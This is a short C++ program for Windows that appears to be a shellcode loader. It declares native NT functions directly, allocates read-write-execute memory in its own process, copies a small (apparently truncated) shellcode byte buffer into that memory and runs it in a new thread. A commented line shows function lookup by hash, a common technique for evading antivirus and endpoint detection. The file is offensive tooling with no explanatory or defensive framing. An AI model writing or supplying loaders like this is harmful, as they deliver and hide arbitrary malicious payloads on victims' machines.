#include <iostream>
#include<windows.h>
#include"structures.h"
using namespace std;


unsigned char buf[] =
"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef";


extern "C" virloc NtAllocateVirtualMemory(HANDLE ,PVOID * ,ULONG_PTR,PSIZE_T,ULONG,ULONG);
extern "C" Writeproc NtWriteVirtualMemory(HANDLE ,PVOID ,PVOID ,SIZE_T ,PSIZE_T);
extern "C" createthread NtCreateThreadEx(PHANDLE ,ACCESS_MASK ,POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);
extern "C" waitt NtWaitForSingleObject(HANDLE ,BOOLEAN ,PLARGE_INTEGER);




int main()
{
    SIZE_T ret = 0;
    PVOID  mem = 0;
    SIZE_T ssize = sizeof(buf);
    HANDLE th = NULL;
  

    NtAllocateVirtualMemory((HANDLE)-1, &mem, 0, &ssize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    NtWriteVirtualMemory((HANDLE)-1, mem, buf, sizeof(buf), 0);
    NtCreateThreadEx(&th, THREAD_ALL_ACCESS, 0, (HANDLE)-1, mem, 0, 0, 0, 0, 0, 0);
    NtWaitForSingleObject(th, FALSE, 0);

    //NtClose closes=(NtClose)GetExport_Table(moduleb, HASH_func((char*)"NtClose"));
    //closes(th);


    return 0;
}

